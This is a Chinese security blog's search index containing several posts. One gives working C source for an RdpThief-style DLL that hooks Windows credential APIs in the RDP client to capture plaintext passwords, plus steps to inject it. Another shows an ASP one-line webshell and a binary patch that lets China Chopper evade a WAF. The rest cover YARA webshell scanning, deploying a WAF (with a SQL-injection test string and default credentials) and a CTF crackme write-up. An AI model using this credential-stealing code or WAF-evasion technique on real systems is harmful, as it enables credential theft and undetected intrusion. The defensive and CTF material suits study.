<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>获取RDP连接中密码的方法</title>
    <url>/2018/01/15/%E8%8E%B7%E5%8F%96RDP%E8%BF%9E%E6%8E%A5%E4%B8%AD%E5%AF%86%E7%A0%81%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>渗透过程中，当发现RDP连接中有记录，但密码未保存，找到RdpThief，本文是一篇利用复现。</p>
<p>#实践</p>
<blockquote>
<p>系统<br>windows 7 32</p>
<p>工具<br><a href="http://www.rohitab.com/apimonitor" target="_blank" rel="external">API Monitor</a><br><a href="https://www.cheatengine.org/" target="_blank" rel="external">Cheat Engine6.7</a><br><a href="https://github.com/0x09AL/RdpThief" target="_blank" rel="external">RdpThief</a><br><a id="more"></a><br>将API Monitor，附加选择mstsc进程，如图所示：<br><img src="/images/jt/6671501-c3cf4f361cf0a752.png" alt="监听RDP进程"></p>
</blockquote>
<p>RDP点击连接，并查看API Monitor列表<br><img src="/images/jt/6671501-839e4eb942b3e86d.png" alt="RDP连接"></p>
<p>如果未监听到，请在左侧API帅选器中勾选如图<br><img src="/images/jt/6671501-078070b69409f2b4.png" alt="抓取RDP调用API过程"></p>
<p>可以看到，连接IP出现在CredReadW的调用中，直接HOOK这个位置就可以获取连接IP，方法很多可以E语言实现比较简单，这里我们参考RdpThief源码，使用<a href="https://github.com/Microsoft/Detours" target="_blank" rel="external">Detours</a><br>框架来实现HOOK。</p>
<p><img src="/images/it/6671501-2c115186cf0e5592.png" alt="Detours目录"><br>首先编译框架，利用VS自带工具VsDevCmd.bat，cd到Detours的src目录<br>使用nmake命令编译，并安装框架<br><img src="/images/it/6671501-60f8f9b52bab4e19.png" alt="编译安装框架"></p>
<p><img src="/images/it/6671501-51fdb06713b5d29e.png" alt="代码"></p>
<p>这里直接使用MessageBoxW将HOOK的结果弹出，查看效果。<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;detours.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dpapi.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wincred.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;strsafe.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;subauth.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SECURITY_WIN32 </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sspi.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"crypt32.lib"</span>)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"Advapi32.lib"</span>)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"Secur32.lib"</span>)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">BOOL</span><span class="params">(WINAPI *OriginalCredReadW)</span><span class="params">(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential)</span> </span>= CredReadW;</div><div class="line"><span class="function">BOOL <span class="title">HookedCredReadW</span><span class="params">(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential)</span></span></div><div class="line">&#123;</div><div class="line">	MessageBoxW(<span class="literal">NULL</span>, TargetName,<span class="string">L"Hostname"</span>,<span class="number">0</span>);</div><div class="line">	<span class="keyword">return</span> OriginalCredReadW(TargetName, Type, Flags, Credential);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">BOOL</span><span class="params">(WINAPI *OriginalCredIsProtectedW)</span><span class="params">(LPWSTR pszProtectedCredentials, CRED_PROTECTION_TYPE *pProtectionType)</span> </span>= CredIsProtectedW;</div><div class="line"><span class="function">BOOL <span class="title">HookedCredIsProtectedW</span><span class="params">(LPWSTR pszProtectedCredentials, CRED_PROTECTION_TYPE *pProtectionType)</span></span></div><div class="line">&#123;</div><div class="line">	MessageBoxW(<span class="literal">NULL</span>, pszProtectedCredentials, <span class="string">L"Password"</span>, <span class="number">0</span>);</div><div class="line">	<span class="keyword">return</span> OriginalCredIsProtectedW(pszProtectedCredentials, pProtectionType);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> (DetourIsHelperProcess()) &#123;</div><div class="line">		<span class="keyword">return</span> TRUE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH) &#123;</div><div class="line">		DetourRestoreAfterWith();</div><div class="line">		DetourTransactionBegin();</div><div class="line">		DetourUpdateThread(GetCurrentThread());</div><div class="line">		DetourAttach(&amp;(PVOID&amp;)OriginalCredReadW, HookedCredReadW);</div><div class="line">		DetourAttach(&amp;(PVOID&amp;)OriginalCredIsProtectedW, HookedCredIsProtectedW);</div><div class="line">		DetourTransactionCommit();</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (dwReason == DLL_PROCESS_DETACH) &#123;</div><div class="line">		DetourTransactionBegin();</div><div class="line">		DetourUpdateThread(GetCurrentThread());</div><div class="line">		DetourDetach(&amp;(PVOID&amp;)OriginalCredReadW, HookedCredReadW);</div><div class="line">		DetourDetach(&amp;(PVOID&amp;)OriginalCredIsProtectedW, HookedCredIsProtectedW);</div><div class="line">		DetourTransactionCommit();</div><div class="line"></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这2个坑点，第1需要选择多线程编译模式，第2编译要用Release否则注入后程序会崩溃。<br><img src="/images/it/6671501-81e3ab6dad3e89d8.png" alt="多线程/MT"></p>
<p><img src="/images/it/6671501-3f913c4fa3236af9.png" alt="Release"></p>
<p>编译后，使用Cheat Engine将DLL注入mstsc进程，真实项目中，可通过PE修改方式直接使mstsc原生调用DLL。<br><img src="/images/it/6671501-4ab2ef9c46c2a9cd.png" alt="注入DLL"></p>
<p><img src="/images/it/6671501-2576600228e8356d.png" alt="获取服务器地址"></p>
<p><img src="/images/it/6671501-c199db5b4356ecf4.png" alt="获取服务器密码"></p>
<p>#参考链接<br><a href="https://mp.weixin.qq.com/s/4CRBFqDLzjyziNkz17-c5A" target="_blank" rel="external">https://mp.weixin.qq.com/s/4CRBFqDLzjyziNkz17-c5A</a></p>
<p><a href="https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/" target="_blank" rel="external">https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/</a></p>
<p><a href="https://github.com/0x09AL/RdpThief" target="_blank" rel="external">https://github.com/0x09AL/RdpThief</a></p>
]]></content>
      <categories>
        <category>RDP</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>看我如何使用yara扫描webshell</title>
    <url>/2017/10/13/%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8yara%E6%89%AB%E6%8F%8Fwebshell/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Yara是一款根据规则库快速匹配文本或程序或进程的工具，杀毒软件早年查杀软件就靠特征匹配，而这个工具就是匹配器，只要你的规则写的足够强大，他可以找出任何符合规则的目标，也就是规则写得好就没有能逃过查杀的Webshell。</p>
<blockquote>
<p>github<br><a href="https://github.com/VirusTotal/yara" target="_blank" rel="external">https://github.com/VirusTotal/yara</a></p>
</blockquote>
<a id="more"></a>
<h1 id="windows编译使用"><a href="#windows编译使用" class="headerlink" title="windows编译使用"></a>windows编译使用</h1><p>github源码直接有windows版本<br><img src="/images/jt/6671501-b52deedeea0997d3.png" alt="github源码直接有windows版本"></p>
<p>使用visual studio 2015打开直接生成即可</p>
<p><img src="/images/jt/6671501-afb927a7d791adcd.png" alt="
使用visual studio 2015打开直接生成即可"></p>
<p>Debug目录下生成了yara64.exe<br><img src="/images/jt/6671501-dde1433dbb94df95.png" alt="Debug目录下生成了yara64.exe"></p>
<p>运行yara<br><img src="/images/jt/6671501-8950a7d82ddedd39.png" alt="运行yara"></p>
<p>调用方式</p>
<blockquote>
<p>yara64.exe 参数 规则文件 目标文件或目录<br>例如<br>yara64.exe generic_jsp.jar cmd.jsp<br>yara64.exe generic_jsp.jar cmd.jsp -s</p>
</blockquote>
<p>generic_jsp.jar使jspshell的扫描规则。</p>
<p>官方也发布了一些规则</p>
<blockquote>
<p><a href="https://github.com/Yara-Rules/rules" target="_blank" rel="external">https://github.com/Yara-Rules/rules</a></p>
</blockquote>
<p><img src="/images/jt/6671501-5fc673b688bd67d9.png" alt="例子"></p>
<p>具体参数可通过–help查看</p>
<p><img src="/images/jt/6671501-9d89438b94788ac5.png" alt="具体参数可通过--help查看"></p>
<h1 id="Linux编译使用"><a href="#Linux编译使用" class="headerlink" title="Linux编译使用"></a>Linux编译使用</h1><p>我使用的使ubuntu,从github下载源码后</p>
<blockquote>
<p>sudo apt-get install automake libtool make gcc<br>sudo apt-get install flex bison<br>chmod 777 bootstrap.sh<br>./bootstrap.sh<br>chmod 777 configure<br>./configure<br>sudo make install</p>
</blockquote>
<p>参考：<a href="https://yara.readthedocs.io/en/v3.6.0/gettingstarted.html" target="_blank" rel="external">https://yara.readthedocs.io/en/v3.6.0/gettingstarted.html</a></p>
<p>使用方式跟windows相同这里就不赘述<br><img src="/images/jt/6671501-b9c199c628db9677.png" alt="使用方式跟windows相同这里就不赘述"></p>
<p>使用Webshells_index.jar规则扫描下我的jspshell，看下效果还是不错的<br><img src="/images/jt/6671501-33e554cfc6dbcd6f.png" alt="使用Webshells_index.jar规则扫描下我的jspshell目录，看下效果还是不错的"></p>
]]></content>
      <categories>
        <category>yara</category>
      </categories>
      <tags>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>看我如何搭建一款方便易用的云WAF</title>
    <url>/2017/08/11/%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%80%E6%AC%BE%E6%96%B9%E4%BE%BF%E6%98%93%E7%94%A8%E7%9A%84%E4%BA%91WAF/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当前市面上各种云WAF，主要作用有两个一个是CDN加速，另一个就是做云防护，原理大概就是把域名IP解析权移交WAF提供商，通过他们访问回目标服务器ip，可以隐藏服务器的真实IP。感谢<a href="http://www.caiyongjian.cn" target="_blank" rel="external">菜菜</a>指导。</p>
<blockquote>
<p>环境：<br>Ubuntu 16.04.1 LTS<br>Mysql<br>Ngnix</p>
</blockquote>
<a id="more"></a>
<p>我们使用的是这款云WAF<br><a href="https://waf.xsec.io/" target="_blank" rel="external">https://waf.xsec.io/</a><br><a href="https://github.com/xsec-lab" target="_blank" rel="external">https://github.com/xsec-lab</a></p>
<h1 id="下载与安装"><a href="#下载与安装" class="headerlink" title="下载与安装"></a>下载与安装</h1><p>直接且到root用户下执行命令</p>
<p><img src="/images/jt/6671501-67317746f1c01a9e.png" alt=""><br>安装openresty</p>
<blockquote>
<p>apt-get update<br>apt-get install libreadline-dev libncurses5-dev libpcre3-dev libssl-dev perl make build-essential<br>sudo ln -s /sbin/ldconfig /usr/bin/ldconfig<br>wget <a href="https://openresty.org/download/openresty-1.9.15.1.tar.gz" target="_blank" rel="external">https://openresty.org/download/openresty-1.9.15.1.tar.gz</a><br>tar -zxvf openresty-1.9.15.1.tar.gz<br>cd openresty-1.9.15.1<br>./configure<br>make &amp;&amp; sudo make install</p>
</blockquote>
<p>如果出现如下错误提示<br><img src="/images/jt/6671501-c2e2c884735c1c7d.png" alt=""><br>解决方法</p>
<blockquote>
<p>rm /var/cache/apt/archives/lock<br>rm /var/lib/dpkg/lock</p>
</blockquote>
<p>安装 git</p>
<blockquote>
<p>apt-get install git</p>
</blockquote>
<p>安装mysql</p>
<blockquote>
<p>apt-get install mysql-server</p>
</blockquote>
<p>安装vim</p>
<blockquote>
<p>apt-get install vim</p>
</blockquote>
<p>配置root密码，我这里直接写123456了，后面还会在重复填写一次。<br><img src="/images/jt/6671501-a5faca980cf84cd0.png" alt=""></p>
<h1 id="waf部署与配置"><a href="#waf部署与配置" class="headerlink" title="waf部署与配置"></a>waf部署与配置</h1><p>将x-waf的代码目录放置到openresty的/usr/local/openresty/nginx/conf目录下，然后在openresty的conf的目录下新建vhosts目录</p>
<blockquote>
<p>cd /usr/local/openresty/nginx/conf/<br>git clone <a href="https://github.com/xsec-lab/x-waf.git" target="_blank" rel="external">https://github.com/xsec-lab/x-waf.git</a><br>mkdir vhosts</p>
</blockquote>
<p>备份nginx原配置文件</p>
<blockquote>
<p>cp nginx.conf nginx.conf.bak<br>rm nginx.conf<br>vim nginx.conf</p>
</blockquote>
<p>复制下面的代码，粘贴进去,粘贴进去后保存，然后使用cat命令查看下第一行粘贴是否完整，有的时候第一行会漏掉几个字符，造成nginx报错。<br><figure class="highlight"><table><tr><td class="code"><pre><div class="line">################user  nginx;</div><div class="line">worker_processes auto;</div><div class="line">worker_cpu_affinity auto;</div><div class="line"></div><div class="line">#error_log  logs/error.log;</div><div class="line">#error_log  logs/error.log  debug;</div><div class="line">#error_log  logs/error.log  info;</div><div class="line"></div><div class="line">#pid        logs/nginx.pid;</div><div class="line"></div><div class="line">events &#123;</div><div class="line">    worker_connections  409600;</div><div class="line">&#125;</div><div class="line"></div><div class="line">http &#123;</div><div class="line">    include       mime.types;</div><div class="line">    lua_package_path "/usr/local/openresty/nginx/conf/x-waf/?.lua;/usr/local/lib/lua/?.lua;;";</div><div class="line">    lua_shared_dict limit 100m;</div><div class="line">    lua_shared_dict badGuys 100m;</div><div class="line">    default_type  application/octet-stream;</div><div class="line"></div><div class="line">    #开启lua代码缓存功能</div><div class="line">    lua_code_cache on;</div><div class="line"></div><div class="line">    init_by_lua_file /usr/local/openresty/nginx/conf/x-waf/init.lua;</div><div class="line">    access_by_lua_file /usr/local/openresty/nginx/conf/x-waf/access.lua;</div><div class="line"></div><div class="line">    #log_format shield_access    '$remote_addr - $http_host - "$request" - "$http_cookie"';</div><div class="line">    #access_log pipe:/usr/local/shield/redisclient shield_access;</div><div class="line">    </div><div class="line">    #ssl on;</div><div class="line">    #ssl_certificate certs/cert_chain.crt;</div><div class="line">    #ssl_certificate_key certs/server.key;</div><div class="line">    ssl_session_timeout     5m;</div><div class="line">    ssl_protocols SSLv2 SSLv3 TLSv1;</div><div class="line">    ssl_ciphers ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv2:+EXP;</div><div class="line">    ssl_prefer_server_ciphers on;</div><div class="line"></div><div class="line"></div><div class="line">    sendfile        on;</div><div class="line">    #tcp_nopush     on;</div><div class="line"></div><div class="line">    #keepalive_timeout  0;</div><div class="line">    keepalive_timeout  65;</div><div class="line"> </div><div class="line">    #gzip  on;</div><div class="line">    include vhosts/*.conf;</div><div class="line"></div><div class="line">    server &#123;</div><div class="line">        listen       80;</div><div class="line">        server_name  localhost;</div><div class="line"></div><div class="line">        #charset koi8-r;</div><div class="line"></div><div class="line">        #access_log  logs/host.access.log  main;</div><div class="line"></div><div class="line">        location / &#123;</div><div class="line">            root   html;</div><div class="line">            index  index.html index.htm;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>新建nginx日志目录</p>
<blockquote>
<p>cd /var/log/<br>mkdir nginx</p>
</blockquote>
<p>测试nginx配置是否正确</p>
<blockquote>
<p>/usr/local/openresty/nginx/sbin/nginx -t</p>
</blockquote>
<p>出现如下提示则配置正确<br><img src="/images/jt/6671501-c9cfc8232ee44e8a.png" alt=""></p>
<p>启动waf</p>
<blockquote>
<p>/usr/local/openresty/nginx/sbin/nginx</p>
</blockquote>
<p>使用命令访问</p>
<blockquote>
<p>curl <a href="http://127.0.0.1/\?id\=1%20union%20select%201,2,3" target="_blank" rel="external">http://127.0.0.1/\?id\=1%20union%20select%201,2,3</a></p>
</blockquote>
<p>浏览器访问</p>
<p><img src="/images/jt/6671501-062148d75c420c33.png" alt=""></p>
<h1 id="安装后台"><a href="#安装后台" class="headerlink" title="安装后台"></a>安装后台</h1><p>git上作者提供的教程需要使用go编译，我这里直接提供一个编译好的包。</p>
<blockquote>
<p><a href="http://download.csdn.net/download/dad9988/9929074" target="_blank" rel="external">http://download.csdn.net/download/dad9988/9929074</a></p>
</blockquote>
<p>创建mysql数据库</p>
<blockquote>
<p>mysql -u root -p<br>Create Database waf;</p>
</blockquote>
<p>配置后台</p>
<blockquote>
<p>tar -xvf x-waf-admin0.1-linux-amd64.tar.gz<br>cd x-waf-admin<br>cd conf<br>vim app.ini</p>
</blockquote>
<p>修改数据库帐号密码，以及API_SERVERS</p>
<p><img src="/images/jt/6671501-bb0d1d1ad6f83eae.png" alt=""></p>
<p>启动后台,x-waf-admin目录中启动server</p>
<blockquote>
<p>./server</p>
</blockquote>
<p>默认帐号admin，密码为：x@xsec.io</p>
<h1 id="配置反向代理"><a href="#配置反向代理" class="headerlink" title="配置反向代理"></a>配置反向代理</h1><p><img src="/images/jt/6671501-e24d8355e30803c4.png" alt=""><br>新增一个后端节点，我这里直接用我的博客<a href="http://kongdewei.cn" target="_blank" rel="external">http://kongdewei.cn</a><br>这里的151.101.72.133直接ping自己的域名就可以获得<br><img src="/images/jt/6671501-5c4599e1f42f917c.png" alt=""></p>
<p>保存返回，然后选择同步全部后端配置，出现如下提示则配置正确。<br><img src="/images/jt/6671501-d78b3873f5397be3.png" alt=""><br>修改hosts指向</p>
<blockquote>
<p>vim /etc/hosts</p>
</blockquote>
<p>这里我就直接修改hosts文件指向本地，就不修改域名解析了。</p>
<p><img src="/images/jt/6671501-59269bb922daa05d.png" alt=""></p>
<p>测试访问<br><img src="/images/jt/6671501-cb18969e3b7a6a8e.png" alt=""><br>添加恶意参数查看是否拦截</p>
<p><img src="/images/jt/6671501-282dfe57617ec588.png" alt=""></p>
<p>规则的添加与删除在web后台直接可以操作</p>
<p><img src="/images/jt/6671501-0aeb285ad09108d3.png" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>编写参考<a href="https://waf.xsec.io/docs" target="_blank" rel="external">https://waf.xsec.io/docs</a><br>最初安装配置的时候走了一些弯路，在<a href="http://www.caiyongjian.cn" target="_blank" rel="external">菜菜</a>的指导最终配置成功，关于waf的规则需要自己慢慢收集，最近有人逆向了阿里云waf，有逆向功底的小伙伴可以尝试对成熟的产品进行逆向，挖掘一下他们的规则，添加进去，逆向waf就和他们的一样好用了。</p>
]]></content>
      <categories>
        <category>安全攻防</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>安全攻防</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向修改菜刀过安全狗</title>
    <url>/2017/07/22/%E9%80%86%E5%90%91%E4%BF%AE%E6%94%B9%E8%8F%9C%E5%88%80%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97/</url>
    <content><![CDATA[<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>文章是去年写的，现在菜刀过狗也不是很难了，只是做一个逆向修改菜刀的演示。</p>
<blockquote>
<p>环境：Windows2003<br>中间件：iis6.0<br>安全狗版本：安全狗iis枸杞版3.5<br>菜刀：chopper.exe   md5: e2caee9b7844ea06d964ad138d1da1f9<br>工具：吾爱破解专用版Ollydbg，LordPE，C32ASM</p>
</blockquote>
<a id="more"></a>
<h1 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h1><p>主要是为了绕过安全狗的一句话检测，开启这个就行了。</p>
<p><img src="/images/jt/6671501-7ce6ca36b8408f42.png" alt=""><br>在IIS目录放一句话木马。</p>
<p><img src="/images/jt/6671501-6c03c7d090466f1d.png" alt=""></p>
<blockquote>
<p>GIF89<br>&lt;%eval request(“1”)%&gt;</p>
</blockquote>
<p>最普通的那种，并没有各种乱七八糟的变形之类的。<br>通过浏览器访问。</p>
<p><img src="/images/jt/6671501-1280958ff0e07b59.png" alt=""><br>正常的，并没有被拦截。添加到菜刀列表，访问试试看。</p>
<p><img src="/images/jt/6671501-2b6727021ea9022d.png" alt=""></p>
<p>通过菜刀访问，被安全狗拦截了，打开fiddler看看封包。<br><img src="/images/jt/6671501-90208c02991e4fc6.png" alt=""></p>
<h1 id="分析修改"><a href="#分析修改" class="headerlink" title="分析修改"></a>分析修改</h1><p><img src="/images/jt/6671501-0a857dc4738ef839.png" alt=""></p>
<p>因为以前做过免杀，所以最早的时候没有各种工具可以定位，我是通过OD的一半一半法来定位被查杀的位置。<br>AAAAAAAAAAAAAAABBAAAAAAAAAAAAAAA<br>我当时的想法是，能不能运用在过WAF上，先把特征码对半，然后慢慢对被检测的补位进行定位。</p>
<p><img src="/images/jt/6671501-4af609276dd7bf15.png" alt=""><br>去掉一般的封包重发，还是被拦截，看来特征在前半段。</p>
<p><img src="/images/jt/6671501-3e72a3306f5eefcf.png" alt=""><br>已经没有被拦截的提示，但是程序也是报错了，毕竟代码不完整，于是我想到了之前过安全狗的SQL注入是通过加很长很长的字符，然后就能绕过SQL注入检测，那么如果我给这段封包加很长的字符是不是也可以绕过。</p>
<p><img src="/images/jt/6671501-711be607093c7263.png" alt=""><br>通过增加很长的前缀，就过掉了安全狗，但是如果我每个封包都这样拦截修改是不是太麻烦了。于是我想到了通过OD修改。</p>
<p><img src="/images/jt/6671501-e3af64410a651e61.png" alt=""><br>原版的菜刀并没有加壳，可以直接修改，打开OD查看下字符串。</p>
<p><img src="/images/jt/6671501-f0d93d4c1ef0cf27.png" alt=""><br>这个位置是ASP的原版字符串，通过这里修改就可以修改他的发包，但是因为需要增加的长多比较大，所以原程序并没有那么大的空地址段给我写，要自己另外增加区段。<br>上C32，新建一个文件，然后把前面的字符加进来。</p>
<p><img src="/images/jt/6671501-63598ee88c77e39f.png" alt=""><br>区段做好了，然后用PEid把区段加到程序里。</p>
<p><img src="/images/jt/6671501-20563fbdc384ea2c.png" alt=""><br>然后通过OD修改，字符串偏移位置。</p>
<p><img src="/images/jt/6671501-467b00f1381ca530.png" alt=""><br>这里是004ab000</p>
<p><img src="/images/jt/6671501-d380c6d28f8c51c1.png" alt=""><br>    保存下文件，然后用fiddler抓包查看是否天然带我们的字符串。</p>
<p><img src="/images/jt/6671501-095e2219b13404c6.png" alt=""><br>通过修改发包已经天然带字符串，当然不止修改一个地方，要完成ASP完成可用要修改好几处位置。</p>
<p><img src="/images/jt/6671501-8247ff4e790229f1.png" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>刚开始我认为这些waf是完美的，后来我发现，这些防火墙有些类似于早点的杀毒软件，通过特征库来拦截，只要找对特征，就可以对症下药，不同品牌的防火墙规则不同，但是换汤不换药基本都是这样的套路，兵来将敌水来土堰靠规则并不靠谱，修改web程序中的漏洞才是关键，过度依赖防火墙并不能很好的保护网站。<br>jsp与php 版过防火墙：<a href="http://www.freebuf.com/sectool/140421.html" target="_blank" rel="external">PyCmd 加密隐形木马</a></p>
]]></content>
      <categories>
        <category>逆向分析</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>逆向分析</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【CrackMe】CTF题目-winodws逆向寻找flag</title>
    <url>/2017/07/15/%E3%80%90CrackMe%E3%80%91CTF%E9%A2%98%E7%9B%AE-winodws%E9%80%86%E5%90%91%E5%AF%BB%E6%89%BEflag/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这题目是命令行输入，OD关键位置时候有别于窗口程序，刚开始我是结合CE找到关键点。</p>
<blockquote>
<p>程序下载地址：<a href="http://download.csdn.net/detail/dad9988/9899751" target="_blank" rel="external">http://download.csdn.net/detail/dad9988/9899751</a><br>难度：★<br>使用工具：ollydbg吾爱破解专版<br>运行环境：windows 7 x64</p>
</blockquote>
<a id="more"></a>
<h1 id="程序截图"><a href="#程序截图" class="headerlink" title="程序截图"></a>程序截图</h1><p>之前在一个ctf平台上下载题目。<br><img src="/images/jt/6671501-12ce52fab71d8d63.png" alt=""></p>
<h2 id="错误提示"><a href="#错误提示" class="headerlink" title="错误提示"></a>错误提示</h2><p><img src="/images/jt/6671501-06d7ca95cea4fd1a.png" alt=""></p>
<h2 id="正确提示"><a href="#正确提示" class="headerlink" title="正确提示"></a>正确提示</h2><p><img src="/images/jt/6671501-63afa9d77b031c99.png" alt=""></p>
<h2 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h2><p>通过命令行输入flag，程序对输入信息进行加密运算后与存放在程序内的加密后数值进行比对。</p>
<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>一般载入程序跑起来之后是用过E标签，跳转到程序领空，再寻找关键字符串信息。</p>
<p><img src="/images/jt/6671501-ed25161662f2527c.png" alt=""><br>但这是命令行程序，载入直接就在程序领空，查找字符串</p>
<p><img src="/images/jt/6671501-91cb525e003720a7.png" alt=""></p>
<p>很容易看到一串很可能是flag的东西，直接拿来输入试试看。</p>
<blockquote>
<p>e3nifIH9b_C@n@dH</p>
</blockquote>
<p><img src="/images/jt/6671501-e1dc5851387a9629.png" alt=""></p>
<p>提示错误，并不是那么简单直接进行明文字符对比。</p>
<p><img src="/images/jt/6671501-a4e73ac74643b8fd.png" alt=""></p>
<p>在提示输入flag的地方下断<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="number">011B</span>5758    <span class="number">68</span> <span class="number">747B</span>1B01     push reverse_<span class="number">.011B</span>7B74                   ; please enter the flag:</div></pre></td></tr></table></figure></p>
<p>F8步下，随意输入123456回车继续F8步下</p>
<p>关键运算如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="number">011B</span>578F    E8 <span class="number">2</span>AB9FFFF     call reverse_<span class="number">.011B</span>10BE                   ; <span class="comment">//进行Base64编码</span></div><div class="line"><span class="number">011B</span>5794    <span class="number">83</span>C4 <span class="number">0</span>C         add esp,<span class="number">0xC</span></div><div class="line"><span class="number">011B</span>5797    <span class="number">50</span>              push eax</div><div class="line"><span class="number">011B</span>5798    <span class="number">8</span>D85 <span class="number">6</span>CFFFFFF   lea eax,dword ptr ss:[ebp<span class="number">-0x94</span>]</div><div class="line"><span class="number">011B</span>579E    <span class="number">50</span>              push eax</div><div class="line"><span class="number">011B</span>579F    FF15 <span class="number">88B</span>11B01   call dword ptr ds:[&lt;&amp;ucrtbased.<span class="built_in">strncpy</span>&gt;] ; ucrtbase.<span class="built_in">strncpy</span></div><div class="line"><span class="number">011B</span>57A5    <span class="number">83</span>C4 <span class="number">0</span>C         add esp,<span class="number">0xC</span></div><div class="line"><span class="number">011B</span>57A8    <span class="number">3B</span>F4            cmp esi,esp</div><div class="line"><span class="number">011B</span>57AA    E8 <span class="number">78B</span>9FFFF     call reverse_<span class="number">.011B</span>1127</div><div class="line"><span class="number">011B</span>57AF    <span class="number">8</span>D85 <span class="number">6</span>CFFFFFF   lea eax,dword ptr ss:[ebp<span class="number">-0x94</span>]</div><div class="line"><span class="number">011B</span>57B5    <span class="number">50</span>              push eax</div><div class="line"><span class="number">011B</span>57B6    E8 <span class="number">0</span>DB9FFFF     call reverse_<span class="number">.011B</span>10C8</div><div class="line"><span class="number">011B</span>57BB    <span class="number">83</span>C4 <span class="number">04</span>         add esp,<span class="number">0x4</span></div><div class="line"><span class="number">011B</span>57BE    <span class="number">8985</span> <span class="number">60F</span>FFFFF   mov dword ptr ss:[ebp<span class="number">-0xA0</span>],eax</div><div class="line"><span class="number">011B</span>57C4    C785 <span class="number">54F</span>FFFFF <span class="number">0</span>&gt;mov dword ptr ss:[ebp<span class="number">-0xAC</span>],<span class="number">0x0</span>          ; <span class="comment">//开始循环</span></div><div class="line"><span class="number">011B</span>57CE    EB <span class="number">0F</span>           jmp <span class="keyword">short</span> reverse_<span class="number">.011B</span>57DF</div><div class="line"><span class="number">011B</span>57D0    <span class="number">8B</span>85 <span class="number">54F</span>FFFFF   mov eax,dword ptr ss:[ebp<span class="number">-0xAC</span>]</div><div class="line"><span class="number">011B</span>57D6    <span class="number">83</span>C0 <span class="number">01</span>         add eax,<span class="number">0x1</span>                              ; 每次循环eax++</div><div class="line"><span class="number">011B</span>57D9    <span class="number">8985</span> <span class="number">54F</span>FFFFF   mov dword ptr ss:[ebp<span class="number">-0xAC</span>],eax</div><div class="line"><span class="number">011B</span>57DF    <span class="number">8B</span>85 <span class="number">54F</span>FFFFF   mov eax,dword ptr ss:[ebp<span class="number">-0xAC</span>]</div><div class="line"><span class="number">011B</span>57E5    <span class="number">3B</span>85 <span class="number">60F</span>FFFFF   cmp eax,dword ptr ss:[ebp<span class="number">-0xA0</span>]          ; 